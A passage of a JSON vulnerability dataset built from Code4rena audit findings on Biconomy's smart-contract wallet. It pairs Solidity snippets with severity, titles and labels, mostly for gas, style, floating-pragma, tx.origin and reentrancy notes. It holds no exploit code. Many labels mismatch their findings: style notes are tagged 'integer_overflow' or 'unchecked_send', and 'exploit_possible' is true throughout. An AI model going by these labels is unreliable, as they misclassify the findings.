    "code": "\n168    function innerHandleOp(bytes calldata callData, UserOpInfo memory opInfo, bytes calldata context) external returns (uint256 actualGasCost) {\n+        require(msg.sender == address(this), \"AA92 internal call only\");\n169         uint256 preGas = gasleft();\n-         require(msg.sender == address(this), \"AA92 internal call only\");\n171         MemoryUserOp memory mUserOp = opInfo.mUserOp;\n172\n173        IPaymaster.PostOpMode mode = IPaymaster.PostOpMode.opSucceeded;\n174        if (callData.length > 0) {\n175\n176            (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);\n177            if (!success) {\n178                if (result.length > 0) {\n179                    emit UserOperationRevertReason(opInfo.userOpHash, mUserOp.sender, mUserOp.nonce, result);\n180                }\n181                mode = IPaymaster.PostOpMode.opReverted;\n182            }\n183        }\n184\n185    unchecked {\n186        uint256 actualGas = preGas - gasleft() + opInfo.preOpGas;\n187        //note: opIndex is ignored (relevant only if mode==postOpReverted, which is only possible outside of innerHandleOp)\n188        return _handlePostOp(0, mode, opInfo, context, actualGas);\n189    }\n190    }\n\n203    function _copyUserOpToMemory(UserOperation calldata userOp, MemoryUserOp memory mUserOp) internal pure {\n+            require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\n204        mUserOp.sender = userOp.sender;\n205        mUserOp.nonce = userOp.nonce;\n206        mUserOp.callGasLimit = userOp.callGasLimit;\n207        mUserOp.verificationGasLimit = userOp.verificationGasLimit;\n208        mUserOp.preVerificationGas = userOp.preVerificationGas;\n209        mUserOp.maxFeePerGas = userOp.maxFeePerGas;\n210        mUserOp.maxPriorityFeePerGas = userOp.maxPriorityFeePerGas;\n211        bytes calldata paymasterAndData = userOp.paymasterAndData;\n212        if (paymasterAndData.length > 0) {\n-            require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\n214            mUserOp.paymaster = address(bytes20(paymasterAndData[: 20]));\n215        } else {\n216            mUserOp.paymaster = address(0);\n217        }\n218    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "REQUIRE() / REVERT() THAT CHECK INPUT ARGUMENTS SHOULD BE AT THE TOP",
    "description": "Checks that involve constants should come before state variables checks, function calls and calculations. [SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L363-L375) 363    function requiredTxGas( 364         address to, 365         uint256 value,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 44,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n    function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {        \n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "LINES ARE TOO LONG",
    "description": "Usually lines in source code are limited to 80 characters. Today's screens are much larger so it's reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over 164 characters, the lines below should be split when they reach that length. [SmartAccount.sol](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489) function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.181,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: base/ModuleManager.sol\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L124\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[Gas-02] ``uncheck``` Arithmatic Operation that would never be ````Underflow/Overflow```",
    "description": "*Instances(1)* File: base/ModuleManager.sol https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/base/ModuleManager.sol#L124",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.169,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n    function setOwner(address _newOwner) external mixedAuth {\n        require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n        address oldOwner = owner;\n        owner = _newOwner;\n        emit EOAChanged(address(this), oldOwner, _newOwner);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "**[G-01] Variable Assignment in Event**",
    "description": "5 gas can be saved by assigning `owner` within the event. This also follows checks-effects-interactions due to right-to-left evaluation. *There is 1 instance of this issue:* File: contracts/smart-contract-wallet/SmartAccount.sol function setOwner(address _newOwner) external mixedAuth { require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.345,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/libs/LibAddress.sol\n\n    /**\n     * @notice Will return true if provided address is a contract\n     * @param account Address to verify if contract or not\n     * @dev This contract will return false if called within the constructor of\n     *      a contract's deployment, as the code is not yet stored on-chain.\n     */\n    function isContract(address account) internal view returns (bool) {\n        uint256 csize;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { csize := extcodesize(account) }\n        return csize != 0;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "**[G-02] Use Global Address Code Length**",
    "description": "10 gas can be saved by using the built-in `<address>.code.length > 0`. *There are 2 instances of this issue:* File: contracts/smart-contract-wallet/libs/LibAddress.sol /** * @notice Will return true if provided address is a contract",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.593,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n    /// @dev Returns the chain id used by this contract.\n    function getChainId() public view returns (uint256) {\n        uint256 id;\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            id := chainid()\n        }\n        return id;\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Gas",
    "title": "**[G-03] Use Global Block Chain Id**",
    "description": "13 gas can be saved by using the built-in `block.chainid` in place of this function. This also reduces the bytecode size as this function can be removed completely, given it is only used once. *There is 1 instance of this issue:* File: contracts/smart-contract-wallet/SmartAccount.sol /// @dev Returns the chain id used by this contract. function getChainId() public view returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.33,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        //review\n        if(v == 0) {\n            // If v is 0 then it is a contract signature\n            // When handling contract signatures the address of the contract is encoded into r\n            _signer = address(uint160(uint256(r)));\n\n                // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes\n                // This check is not completely accurate, since it is possible that more signatures than the threshold are send.\n                // Here we only check that the pointer is not pointing inside the part that is being processed\n                require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n            ...\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "**[G-04] Simplify Signature Checking Arithmetic**",
    "description": "115 can be saved by removing multiplication by 1 in signature checking arithmetic given the account is a 1/1 multisig and so the number of required signatures will only ever be 1. This will be true unless the code changes to support multiple signers per account, in which case it is recommended to document this saving and code requirement for the case of multiple signers. It is also recommended to remove the unnecessary stack variable `i` on #L302 and pass `0` to `signatureSplit` directly. *There is 1 instance of this issue:* File: contracts/smart-contract-wallet/SmartAccount.sol /** * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 31,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nFile: contracts/smart-contract-wallet/SmartAccount.sol\n\n    /**\n     * @dev Checks whether the signature provided is valid for the provided data, hash. Will revert otherwise.\n     * @param dataHash Hash of the data (could be either a message hash or transaction hash)\n     * @param signatures Signature data that should be verified. Can be ECDSA signature, contract signature (EIP-1271) or approved hash.\n     */\n    function checkSignatures(\n        bytes32 dataHash,\n        bytes memory data,\n        bytes memory signatures\n    ) public view virtual {\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n        uint256 i = 0;\n        address _signer;\n        (v, r, s) = signatureSplit(signatures, i);\n        ...\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "**[G-05] Remove Unnecessary Local Variable**",
    "description": "Do not create local variables to cache memory reads when they are referenced only once and can be used directly. *There are 2 instances of this issue:* File: contracts/smart-contract-wallet/paymasters/verifying/VerifyingSingletonPaymaster.sol function withdrawTo(address payable withdrawAddress, uint256 amount) public override { uint256 currentBalance = paymasterIdBalances[msg.sender];",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 21,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.723,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n**[G-04] Function guaranteed to revert when called by normal users can be marked `payable`** \n\nIf a function modifier such as `onlyOwner` is used, the function will revert if a normal user tries to pay the function. Marking the function as payable will lower the gas cost for legitimate callers because the compiler will not include checks for whether a payment was provided. The extra opcodes avoided are\u00a0`CALLVALUE(2),DUP1(3),ISZERO(3),PUSH2(3),JUMPI(10),PUSH1(3),DUP1(3),REVERT(0),JUMPDEST(1),POP(2)`, which costs an average of about 21 gas per call to the function, in addition to the extra deployment cost.\n\n*There are 6 instances of this issue:*\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Gas",
    "title": "**[G-01] Empty blocks should be removed or emit something**",
    "description": "The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be\u00a0`abstract`\u00a0and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified (`if(x){}else if(y){...}else{...}`\u00a0=>\u00a0`if(!x){if(y){...}else{...}}`) *There are 1 instances of this issue:* /SmartAccount.sol 550: receive() external payable {} **[G-02]** **Defined Variables Used Only Once**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.653,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nUse of tx.origin: \"tx.origin\" is useful only in very exceptional cases. \nIf you use it for authentication, you usually want to replace it by \"msg.sender\", because otherwise any contract you call can act on your behalf.\nUsing \"tx.origin\" as a security control can lead to authorization bypass vulnerabilities. Consider using \"msg.sender\" unless you really know what you are doing.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "## [L-01]",
    "description": "SWC-115 Authorization through tx.origin File /contracts/smart-contract-wallet/SmartAccount.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L257",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.381,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nUse of tx.origin: \"tx.origin\" is useful only in very exceptional cases. \nIf you use it for authentication, you usually want to replace it by \"msg.sender\", because otherwise any contract you call can act on your behalf.\nUsing \"tx.origin\" as a security control can lead to authorization bypass vulnerabilities. Consider using \"msg.sender\" unless you really know what you are doing.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-02]",
    "description": "SWC-115 Authorization through tx.origin File /contracts/smart-contract-wallet/SmartAccount.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L281",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.381,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nUse of tx.origin: \"tx.origin\" is useful only in very exceptional cases. \nIf you use it for authentication, you usually want to replace it by \"msg.sender\", because otherwise any contract you call can act on your behalf.\nUsing \"tx.origin\" as a security control can lead to authorization bypass vulnerabilities. Consider using \"msg.sender\" unless you really know what you are doing.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-03]",
    "description": "SWC-115 Authorization through tx.origin File /contracts/smart-contract-wallet/SmartAccount.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.381,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-04]",
    "description": "SWC-103 Floating Pragma File /aa-4337/core/EntryPoint.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L6",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-05]",
    "description": "SWC-103 Floating Pragma File /aa-4337/core/SenderCreator.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nAn external message call to an address specified by the caller is executed. \nNote that the callee account might contain arbitrary code and could re-enter any function within this contract. \nReentering the contract in an intermediate state may lead to unexpected behaviour. \nMake sure that no state modifications are executed after this call and/or reentrancy guards are in place.\nOne of the major dangers of calling external contracts is that they can take over the control flow. \nIn the reentrancy attack (a.k.a. recursive call attack), a malicious contract calls back into the calling contract before the first invocation of the function is finished. \nThis may cause the different invocations of the function to interact in undesirable ways.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-06]",
    "description": "SWC-107 Reentrancy File /aa-4337/core/SenderCreator.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol#L21",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.745,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-07]",
    "description": "SWC-103 Floating Pragma File /aa-4337/core/StakeManager.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-08]",
    "description": "SWC-103 Floating Pragma File /aa-4337/interfaces/IPaymaster.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-09]",
    "description": "SWC-103 Floating Pragma File /aa-4337/interfaces/IAggregatedAccount.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-10]",
    "description": "SWC-103 Floating Pragma File /aa-4337/interfaces/IEntryPoint.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol#L6",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-11]",
    "description": "SWC-103 Floating Pragma File /aa-4337/utils/Exec.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/utils/Exec.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-12]",
    "description": "SWC-103 Floating Pragma File /aa-4337/interfaces/IStakeManager.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-13]",
    "description": "SWC-103 Floating Pragma File /aa-4337/interfaces/UserOperation.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nContracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. \nLocking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-14]",
    "description": "SWC-103 Floating Pragma File /paymasters/BasePaymaster.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/BasePaymaster.sol#L2",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.318,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nThe contract account state is accessed after an external call. \nIn the reentrancy attack (a.k.a. recursive call attack), a malicious contract calls back into the calling contract before the first invocation of the function is finished. \nThis may cause the different invocations of the function to interact in undesirable ways.\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-15]",
    "description": "SWC-107 Reentrancy File /libs/MultiSendCallOnly.sol URL https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol#L47",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.328,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::51 => address public owner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::59 => IEntryPoint private _entryPoint;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::51 => address public owner;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::59 => IEntryPoint private _entryPoint;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::51 => address public owner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::59 => IEntryPoint private _entryPoint; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::51 => address public owner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::59 => IEntryPoint private _entryPoint;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
